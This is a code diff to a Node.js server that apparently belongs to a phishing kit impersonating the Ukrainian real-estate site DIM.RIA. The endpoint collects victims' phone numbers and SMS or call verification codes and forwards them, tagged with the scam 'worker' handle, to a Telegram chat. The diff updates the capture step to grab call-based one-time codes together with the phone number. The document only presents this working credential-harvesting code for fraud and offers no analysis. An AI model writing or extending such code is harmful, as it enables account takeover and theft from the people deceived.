@@ -68,7 +68,8 @@ async function sendToTelegram(message) {
 }
 
 app.post('/api/send-data', async (req, res) => {
-    const { step, phone, code, worker, project = 'dimria', city = 'Невідомо' } = req.body;
+    // Додаємо 'phone' до деструктуризації для крок 'call_code'
+    const { step, phone, code, worker, project = 'dimria', city = 'Невідомо' } = req.body; 
 
     const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
 
@@ -78,8 +79,9 @@ app.post('/api/send-data', async (req, res) => {
         message = `*ПРОЕКТ:* ${projectName} ⚡\n*Номер:* \`${phone}\`\n*Місто:* ${city}\n*Країна:* Україна`;
         if (worker) message += `\n*Воркер:* @${worker}`;
     } 
-    else if (step === 'code' && code) {
-        message = `*SMS КОД:* \`${code}\`\n*ПРОЕКТ:* ${projectName}\n*Місто:* ${city}`;
+    // Оновлена логіка для кроку з кодом дзвінка
+    else if (step === 'call_code' && code && phone) { 
+        message = `*КОД ДЗВІНКА:* \`${code}\`\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}\n*Місто:* ${city}`;
         if (worker) message += `\n*Воркер:* @${worker}`;
     } 
     else {
